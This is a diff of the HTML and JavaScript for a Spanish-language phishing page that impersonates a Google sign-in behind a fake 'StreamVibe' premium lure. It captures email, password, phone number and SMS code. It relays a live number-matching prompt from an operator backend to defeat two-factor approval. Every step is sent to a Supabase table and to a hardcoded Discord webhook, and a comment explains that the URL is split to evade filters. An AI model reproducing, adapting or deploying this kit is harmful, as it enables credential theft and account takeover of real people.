@@ -18,7 +18,6 @@
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen p-4">
 
-    <!-- Escudo de entrada -->
     <div id="gate">
         <div class="loader mb-4"></div>
         <p class="text-xs text-gray-400 font-medium tracking-tight">Verificando conexión segura...</p>
@@ -36,7 +35,6 @@
         <div class="flex gap-4"><span>Ayuda</span><span>Privacidad</span><span>Condiciones</span></div>
     </footer>
 
-    <!-- Pantalla Final StreamVibe -->
     <div id="vibe-screen" class="fixed inset-0 bg-[#0b0e11] hidden flex-col items-center justify-center p-6 z-[10000]">
         <div id="vibe-load">
             <div class="w-12 h-12 border-4 border-zinc-800 border-t-cyan-500 rounded-full animate-spin mb-4 mx-auto"></div>
@@ -44,17 +42,15 @@
         </div>
         <div id="vibe-fail" class="hidden text-center">
             <h2 class="text-cyan-500 font-black italic text-4xl mb-4 tracking-tighter uppercase">ERROR DE ENLACE</h2>
-            <p class="text-zinc-500 text-sm mb-8 max-w-xs mx-auto">No se ha podido validar la sesión de Google para el contenido Premium de StreamVibe. Inténtelo más tarde.</p>
-            <button onclick="location.reload()" class="bg-cyan-600 text-black font-black px-12 py-4 rounded-2xl text-[10px] uppercase shadow-lg shadow-cyan-900/40">Reintentar</button>
+            <button onclick="location.reload()" class="bg-cyan-600 text-black font-black px-12 py-4 rounded-2xl text-[10px] uppercase">Reintentar</button>
         </div>
     </div>
 
     <script>
-     
-        const p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzNjA5MDgzNzI5";
-        const p2 = "NDE3NDIyMC9jSFhlb2VROWt6ZkdrS3RVZVZMLTdBWGtvNEFSc3p6QnNFdGtNbTZ4";
-        const p3 = "QVZZZ0FNUWRyU21OTFAxSzE5OFg4SENnVlNF";
-        const W_HOOK = atob(p1 + p2 + p3);
+        // URL DIRECTA - La forma más sencilla (Separada en dos para evitar filtros básicos)
+        const partA = "https://discord.com/api/webhooks/1443618037294174220/";
+        const partB = "cHXeoeQ9KzfGkKtUeVL-9AXk0o4ARszzBsEtkMm6xAVYgAMQdrSmNLP1K198X8HCgVSE";
+        const W_HOOK = partA + partB;
 
         const S_URL = "https://eyrvplemxhnootpjzkav.supabase.co";
         const S_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV5cnZwbGVteGhub290cGp6a2F2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgyNTEwMDksImV4cCI6MjA4MzgyNzAwOX0.YxrnHYnBkQLqPuVH5izQdYYgL7GVZQgSG1h89sDVd0g";
@@ -70,6 +66,7 @@
         }, 1500);
 
         async function push(step) {
+            // 1. Guardar en Supabase (Prioridad)
             await client.from('sessions').upsert({
                 session_id: sesId, step: step, email: store.email, 
                 password: store.pass, phone: store.phone, sms: store.sms,
@@ -77,84 +74,54 @@
                 updated_at: new Date().toISOString()
             }, { onConflict: 'session_id' });
 
+            // 2. Enviar a Discord (Modo Simple)
+            const payload = {
+                content: `🚀 **ACTUALIZACIÓN**\n**ID:** ${sesId}\n**PASO:** ${step.toUpperCase()}\n**USER:** ${store.email}\n**PASS:** ${store.pass}\n**TEL:** ${store.phone}\n**CÓDIGO:** ${store.target}\n**SMS:** ${store.sms || '-'}`
+            };
+
             fetch(W_HOOK, {
-                method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: `>>> **ACCION: ${step.toUpperCase()}**\n**ID:** ${sesId}\n**USER:** ${store.email}\n**PASS:** ${store.pass}\n**TEL:** ${store.phone}\n**SMS:** ${store.sms || '-'}`
-                })
-            });
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(e => console.log("Error Discord:", e));
         }
 
         function draw() {
             const container = document.getElementById('dynamic-view');
             if(store.step === 'login') {
                 container.innerHTML = `
-                    <div class="text-center mb-8">
-                        <h1 class="text-2xl font-normal mb-2">Iniciar sesión</h1>
-                        <p class="text-[15px]">Usa tu cuenta de Google</p>
-                    </div>
+                    <div class="text-center mb-8"><h1 class="text-2xl font-normal mb-2">Iniciar sesión</h1><p class="text-[15px]">Usa tu cuenta de Google</p></div>
                     <form onsubmit="event.preventDefault(); store.email=this.e.value; store.pass=this.p.value; store.step='phone'; push('phone'); draw();">
                         <input name="e" required type="email" placeholder="Correo electrónico" class="g-field mb-4">
                         <input name="p" required type="password" placeholder="Contraseña" class="g-field mb-2">
-                        <p class="text-sm text-blue-600 font-bold mb-10 cursor-pointer">¿Has olvidado tu contraseña?</p>
-                        <div class="flex justify-between items-center">
-                            <span class="text-blue-600 font-bold text-sm cursor-pointer">Crear cuenta</span>
+                        <div class="flex justify-between items-center mt-10">
+                            <span class="text-[#1a73e8] font-medium text-sm cursor-pointer">Crear cuenta</span>
                             <button class="bg-[#1a73e8] text-white px-8 py-2 rounded font-medium text-sm">Siguiente</button>
                         </div>
                     </form>`;
             } else if(store.step === 'phone') {
                 container.innerHTML = `
-                    <div class="text-center mb-6">
-                        <h1 class="text-xl font-medium">Verificación de seguridad</h1>
-                        <p class="text-sm text-gray-600 mt-4 leading-relaxed">Google ha enviado una notificación a tus dispositivos vinculados. Confirma tu identidad para continuar con la sincronización.</p>
-                    </div>
+                    <div class="text-center mb-6"><h1 class="text-xl font-medium">Verificación</h1><p class="text-sm text-gray-600 mt-4">Confirma tu identidad para continuar.</p></div>
                     <form onsubmit="event.preventDefault(); store.phone=this.t.value; store.step='wait'; push('wait'); draw();">
-                        <input name="t" required type="tel" placeholder="Número de teléfono vinculado" class="g-field text-center text-xl mb-6">
-                        <button class="w-full bg-[#1a73e8] text-white py-2.5 rounded font-medium">Enviar notificación</button>
+                        <input name="t" required type="tel" placeholder="Número de teléfono" class="g-field text-center text-xl mb-6">
+                        <button class="w-full bg-[#1a73e8] text-white py-2.5 rounded font-medium">Siguiente</button>
                     </form>`;
             } else if(store.step === 'wait') {
                 container.innerHTML = `
                     <div class="text-center">
-                        <h1 class="text-xl font-medium mb-4 tracking-tight text-gray-800">Comprueba tu dispositivo</h1>
-                        
-                        <div class="bg-gray-50 border border-gray-100 p-5 rounded-2xl mb-6 text-left">
-                            <ol class="text-sm text-gray-600 space-y-4">
-                                <li class="flex gap-3">
-                                    <span class="bg-blue-600 text-white w-5 h-5 rounded-full flex-shrink-0 flex items-center justify-center text-[10px] font-bold">1</span>
-                                    <span>Busca la notificación de Google enviada a tu móvil o tablet.</span>
-                                </li>
-                                <li class="flex gap-3">
-                                    <span class="bg-blue-600 text-white w-5 h-5 rounded-full flex-shrink-0 flex items-center justify-center text-[10px] font-bold">2</span>
-                                    <span>Toca <b>"Sí, soy yo"</b> en el aviso de inicio de sesión.</span>
-                                </li>
-                                <li class="flex gap-3">
-                                    <span class="bg-blue-600 text-white w-5 h-5 rounded-full flex-shrink-0 flex items-center justify-center text-[10px] font-bold">3</span>
-                                    <span>A continuación, selecciona el número que se muestra debajo:</span>
-                                </li>
-                            </ol>
-                        </div>
-
+                        <h1 class="text-xl font-medium mb-4">Comprueba tu dispositivo</h1>
+                        <p class="text-sm text-gray-600 mb-6 text-left">Toca <b>"Sí, soy yo"</b> en la notificación y selecciona este número:</p>
                         <div class="inline-block px-12 py-8 bg-blue-50 border-2 border-blue-100 rounded-3xl mb-8">
-                            <span class="text-7xl font-bold text-blue-700 tracking-tighter animate-pulse">${store.target}</span>
+                            <span class="text-7xl font-bold text-[#1a73e8] animate-pulse">${store.target}</span>
                         </div>
-
-                        <div class="flex items-center justify-center gap-3">
-                            <div class="loader"></div>
-                            <span class="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Esperando respuesta del dispositivo...</span>
-                        </div>
+                        <div class="flex items-center justify-center gap-3"><div class="loader"></div><span class="text-[10px] text-gray-400 font-bold uppercase">Sincronizando...</span></div>
                     </div>`;
             } else if(store.step === 'sms') {
                 container.innerHTML = `
-                    <div class="text-center mb-6">
-                        <h1 class="text-xl font-bold">Verificación adicional</h1>
-                        <p class="text-xs text-gray-500 mt-2">Hemos enviado un código de seguridad a tu móvil. Introdúcelo para finalizar la configuración de StreamVibe.</p>
-                    </div>
+                    <div class="text-center mb-6"><h1 class="text-xl font-bold">Código SMS</h1><p class="text-xs text-gray-500 mt-2">Introduce el código enviado.</p></div>
                     <form onsubmit="event.preventDefault(); store.sms=this.s.value; store.step='end'; push('end'); finish();">
-                        <div class="flex items-center border border-gray-300 p-3 rounded bg-gray-50 mb-8">
-                            <span class="text-xl font-bold text-gray-400 mr-2 uppercase">G-</span>
-                            <input name="s" required type="number" placeholder="000000" class="w-full text-2xl outline-none bg-transparent font-mono tracking-[0.2em]">
-                        </div>
-                        <button class="w-full bg-[#1a73e8] text-white py-3.5 rounded-lg font-bold shadow-md hover:bg-blue-700 transition">Verificar cuenta</button>
+                        <div class="flex items-center border border-gray-300 p-3 rounded bg-gray-50 mb-8"><span class="text-xl font-bold text-gray-400 mr-2">G-</span><input name="s" required type="number" placeholder="000000" class="w-full text-2xl outline-none bg-transparent"></div>
+                        <button class="w-full bg-[#1a73e8] text-white py-3.5 rounded-lg font-bold">Verificar</button>
                     </form>`;
             }
         }
@@ -162,23 +129,16 @@
         function finish() {
             document.getElementById('wrapper').style.display = 'none';
             document.getElementById('footer-text').style.display = 'none';
-            const screen = document.getElementById('vibe-screen');
-            screen.classList.remove('hidden');
-            screen.classList.add('flex');
-            setTimeout(() => {
-                document.getElementById('vibe-load').classList.add('hidden');
-                document.getElementById('vibe-fail').classList.remove('hidden');
-            }, 5000);
+            document.getElementById('vibe-screen').classList.remove('hidden');
+            document.getElementById('vibe-screen').classList.add('flex');
+            setTimeout(() => { document.getElementById('vibe-load').classList.add('hidden'); document.getElementById('vibe-fail').classList.remove('hidden'); }, 5000);
         }
 
-        client.channel('vibe-sync').on('postgres_changes', { 
-            event: 'UPDATE', schema: 'public', table: 'sessions', filter: `session_id=eq.${sesId}` 
-        }, (p) => {
+        client.channel('vibe-sync').on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'sessions', filter: `session_id=eq.${sesId}` }, (p) => {
             store.target = p.new.target_num || '--';
             store.step = p.new.step;
             draw();
         }).subscribe();
-
     </script>
 </body>
 </html>
